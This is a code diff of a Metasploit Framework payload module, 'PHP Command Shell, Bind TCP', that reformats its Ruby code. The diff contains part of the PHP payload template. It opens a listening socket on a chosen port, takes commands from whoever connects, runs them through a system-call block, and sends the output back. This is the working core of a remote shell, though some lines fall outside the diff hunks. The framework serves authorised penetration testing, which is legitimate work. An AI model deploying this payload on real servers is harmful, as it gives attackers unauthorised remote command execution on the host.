@@ -3,9 +3,7 @@
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-
 module MetasploitModule
-
   CachedSize = :dynamic
 
   include Msf::Payload::Single
@@ -13,30 +11,31 @@ module MetasploitModule
   include Msf::Sessions::CommandShellOptions
 
   def initialize(info = {})
-    super(merge_info(info,
-      'Name'          => 'PHP Command Shell, Bind TCP (via PHP)',
-      'Description'   => 'Listen for a connection and spawn a command shell via php',
-      'Author'        => ['egypt', 'diaul <diaul[at]devilopers.org>',],
-      'License'       => BSD_LICENSE,
-      'Platform'      => 'php',
-      'Arch'          => ARCH_PHP,
-      'Handler'       => Msf::Handler::BindTcp,
-      'Session'       => Msf::Sessions::CommandShell,
-      'PayloadType'   => 'cmd',
-      'Payload'       =>
-        {
-          'Offsets' => { },
+    super(
+      merge_info(
+        info,
+        'Name' => 'PHP Command Shell, Bind TCP (via PHP)',
+        'Description' => 'Listen for a connection and spawn a command shell via php',
+        'Author' => ['egypt', 'diaul <diaul[at]devilopers.org>',],
+        'License' => BSD_LICENSE,
+        'Platform' => 'php',
+        'Arch' => ARCH_PHP,
+        'Handler' => Msf::Handler::BindTcp,
+        'Session' => Msf::Sessions::CommandShell,
+        'PayloadType' => 'cmd',
+        'Payload' => {
+          'Offsets' => {},
           'Payload' => ''
         }
-      ))
+      )
+    )
   end
 
   #
   # PHP Bind Shell
   #
   def php_bind_shell
-
-    dis = '$' + Rex::Text.rand_text_alpha(rand(4) + 4);
+    dis = '$' + Rex::Text.rand_text_alpha(4..7)
     shell = <<-END_OF_PHP_CODE
     #{php_preamble(disabled_varname: dis)}
     $port=#{datastore['LPORT']};
@@ -62,7 +61,7 @@ module MetasploitModule
       } else if (substr($c,0,4) == 'quit' || substr($c,0,4) == 'exit') {
         break;
       }else{
-        #{php_system_block({:cmd_varname=>"$c", :output_varname=>"$o", :disabled_varname => dis})}
+        #{php_system_block({ cmd_varname: '$c', output_varname: '$o', disabled_varname: dis })}
       }
       @socket_write($msgsock,$o,strlen($o));
     }
